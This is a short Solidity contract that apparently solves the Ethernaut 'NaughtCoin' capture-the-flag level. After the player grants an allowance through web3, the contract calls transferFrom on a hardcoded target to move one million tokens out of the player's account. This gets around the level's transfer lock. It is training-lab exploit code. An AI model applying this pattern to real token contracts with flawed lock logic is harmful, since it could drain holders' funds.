// SPDX-License-Identifier: MIT
pragma solidity ^0.8.*;

contract NaughtCoin {

    address target = 0xa2c9fE6FDA1566E8A0b56666BEf20f552bF47D28;
    address player = 0xD64D08C68F6940281c51108734B5b5DA95f62BD5;
    event TestBool(bool);
    event TestUint(uint256);

    // Used web3 js commands to set the allowance with approve()

    function transfer() public {

        bytes memory payload = abi.encodeWithSignature("transferFrom(address,address,uint256)", player, address(this), 1000000 * (10**18));
        (bool success, ) = target.call(payload);
        emit TestBool(success);
    }
}